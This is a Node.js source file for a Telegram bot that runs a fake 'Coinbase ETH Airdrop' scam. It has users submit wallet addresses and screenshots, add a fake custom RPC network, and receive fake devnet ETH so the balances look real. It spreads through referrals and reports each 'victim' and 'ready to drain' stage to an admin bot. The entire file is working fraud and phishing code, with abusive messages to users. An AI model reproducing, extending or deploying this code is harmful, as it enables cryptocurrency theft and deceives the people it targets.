require('dotenv').config();
const { Telegraf } = require('telegraf');
const express = require('express');
const axios = require('axios');

// === CONFIG (USING YOUR EXISTING ENV VARS) ===
const SCAM_BOT_TOKEN = process.env.BOT_TOKEN;           // Already in Render
const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;    // NEW: Add this
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;        // NEW: Your Telegram ID
const TENDERLY_RPC = process.env.TENDERLY_RPC;          // Already in Render

// === BOTS ===
const scamBot = new Telegraf(SCAM_BOT_TOKEN);
const adminBot = new Telegraf(ADMIN_BOT_TOKEN);

// === IN-MEMORY DB ===
let usersDB = {};
const getUser = (id) => usersDB[id] || null;
const saveUser = (user) => { usersDB[user.telegramId] = user; return user; };
const updateUser = (id, updates) => {
  if (usersDB[id]) Object.assign(usersDB[id], updates);
  return usersDB[id];
};
const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);

// === RPC GUIDE ===
const RPC_GUIDE = `
Add this network to Coinbase Wallet:

**Network Name:** Coinbase ETH Airdrop
**RPC URL:** https://rpc.tenderly.co/devnet/coinbase-airdrop-90000
**Chain ID:** 90000
**Currency:** ETH
**Block Explorer:** https://dashboard.tenderly.co
`.trim();

// === SEND TO ADMIN BOT ===
const sendToAdmin = async (text, photo = null) => {
  try {
    if (photo) {
      await adminBot.telegram.sendPhoto(ADMIN_CHAT_ID, photo, { caption: text, parse_mode: 'Markdown' });
    } else {
      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'Markdown' });
    }
    console.log('SENT TO ADMIN:', text.substring(0, 50));
  } catch (err) {
    console.error('ADMIN SEND FAILED:', err.message);
  }
};

// === FAKE ETH SEND (USING YOUR TENDERLY_RPC) ===
const sendFakeETH = async (to, eth) => {
  if (!to || to.startsWith('0xFAKE')) return;
  const wei = (eth * 1e18).toString(16);
  try {
    await axios.post(TENDERLY_RPC, {
      jsonrpc: "2.0",
      method: "eth_sendTransaction",
      params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }],
      id: Date.now()
    });
    console.log(`FAKE ETH SENT: ${eth} → ${to}`);
  } catch (err) {
    console.log('Fake send failed (ignored):', err.message);
  }
};

// === /start ===
scamBot.start(async (ctx) => {
  console.log('START:', ctx.from.id);
  let user = getUser(ctx.from.id);
  const refCode = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;

  if (!user) {
    const code = Math.random().toString(36).substr(2, 8).toUpperCase();
    user = {
      telegramId: ctx.from.id,
      username: ctx.from.username || 'NoUsername',
      referralCode: code,
      referredBy: refCode,
      stage: 'wallet_ss',
      wallet: null,
      referrals: [],
      totalEarned: 0
    };
    saveUser(user);

    // === REFERRAL PAYOUT ===
    if (refCode) {
      const referrer = getUserByCode(refCode);
      if (referrer && referrer.telegramId !== ctx.from.id) {
        referrer.referrals.push(ctx.from.id);
        referrer.totalEarned += 10;
        updateUser(referrer.telegramId, referrer);
        await sendFakeETH(referrer.wallet || '0xFAKE', 0.004);
        scamBot.telegram.sendMessage(referrer.telegramId,
          `*+1 Referral!* $10 ETH sent.\nTotal: $${referrer.totalEarned}\n` +
          `Link: t.me/coinbase_eth_airdrop_bot?start=ref_${referrer.referralCode}`
        );
      }
    }

    // === SEND NEW VICTIM TO ADMIN ===
    await sendToAdmin(
      `*NEW VICTIM*\n` +
      `User: @${user.username}\n` +
      `ID: \`${user.telegramId}\`\n` +
      `Ref Code: \`${code}\`\n` +
      `Referred by: \`${refCode || 'Direct'}\``
    );
  }

  ctx.reply(`Drop your Coinbase wallet address + screenshot, fucker.`);
});

// === PHOTO HANDLER ===
scamBot.on('photo', async (ctx) => {
  console.log('PHOTO FROM:', ctx.from.id);
  let user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start first.');

  const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;

  if (user.stage === 'wallet_ss') {
    user.wallet = "0x" + Math.random().toString(16).substr(2, 40);
    user.stage = 'rpc_guide';
    saveUser(user);

    await sendToAdmin(
      `*WALLET + SS SUBMITTED*\n` +
      `User: @${user.username}\n` +
      `Wallet: \`${user.wallet}\`\n` +
      `Ref: \`${user.referralCode}\``,
      fileId
    );

    ctx.reply(RPC_GUIDE, {
      reply_markup: { inline_keyboard: [[{ text: "I Added Network", callback_data: "rpc_done" }]] }
    });
    return;
  }

  if (user.stage === 'rpc_proof') {
    user.stage = 'twitter_tasks';
    saveUser(user);

    await sendToAdmin(
      `*RPC PROOF*\n` +
      `User: @${user.username}\n` +
      `Wallet: \`${user.wallet}\``,
      fileId
    );

    ctx.reply(`RPC locked. Now:\n1. Follow @BjExchange53077\n2. Like pinned post\n3. Tag 3 friends\nSend proof.`);
    return;
  }

  if (user.stage === 'twitter_proof') {
    user.stage = 'claim_ready';
    saveUser(user);

    await sendToAdmin(
      `*TWITTER PROOF — READY TO DRAIN*\n` +
      `User: @${user.username}\n` +
      `Wallet: \`${user.wallet}\`\n` +
      `Ref Code: \`${user.referralCode}\``,
      fileId
    );

    ctx.reply(
      `*Tasks verified!* You earned $50 ETH!\n\nClick to claim:`,
      {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[{ text: "CLAIM $50 ETH", callback_data: "claim_eth" }]] }
      }
    );
    return;
  }

  ctx.reply("Photo received. Keep going, fucker.");
});

// === BUTTONS ===
scamBot.action('rpc_done', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_guide') return;
  user.stage = 'rpc_proof';
  saveUser(user);
  ctx.reply("Send screenshot of Chain ID 90000 now.");
});

scamBot.action('claim_eth', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user || user.stage !== 'claim_ready') return;

  user.stage = 'claimed';
  saveUser(user);
  await sendFakeETH(user.wallet, 0.02);

  const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);
  ctx.reply(
    `*CLAIMED!* $50 ETH sent to:\n\`\`\`\n${user.wallet}\`\`\`\n\n` +
    `Tx: https://dashboard.tenderly.co/tx/mainnet/${txHash}\n\n` +
    `*Share:* t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}`,
    { parse_mode: 'Markdown' }
  );

  await sendToAdmin(
    `*CLAIMED $50 ETH*\n` +
    `User: @${user.username}\n` +
    `Wallet: \`${user.wallet}\`\n` +
    `Fake Tx: \`${txHash}\`\n` +
    `Ref Link: t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}`
  );
});

// === ERROR HANDLING ===
scamBot.catch((err, ctx) => {
  console.error('SCAM BOT ERROR:', err);
  try { ctx.reply('Error. Try again.'); } catch {}
});

// === SERVER & WEBHOOK ===
const app = express();
app.use(express.json());
app.use(scamBot.webhookCallback(`/bot${SCAM_BOT_TOKEN}`));

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Scam bot LIVE on port ${PORT}`);
  const url = `${process.env.RENDER_EXTERNAL_URL}/bot${SCAM_BOT_TOKEN}`;
  await scamBot.telegram.setWebhook(url);
  console.log('Webhook set:', url);

  // Start admin bot (polling — no webhook needed)
  adminBot.launch();
  console.log('Admin bot polling...');
});
